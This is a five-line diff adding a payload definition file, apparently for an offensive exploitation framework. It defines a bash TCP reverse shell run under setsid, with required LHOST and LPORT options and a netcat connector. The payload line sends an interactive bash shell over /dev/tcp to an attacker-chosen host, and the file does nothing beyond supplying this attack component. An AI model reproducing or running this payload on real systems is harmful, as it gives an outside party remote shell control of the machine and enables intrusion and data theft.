@@ -1,0 +1,5 @@
+title=bash TCP reverse shell payload
+info=using setsid
+required_opts=LHOST;LPORT
+connector=reverse_tcp_netcat
+payload=setsid /bin/bash -i >/dev/tcp/LHOST/LPORT 0<&1 2>&1 &
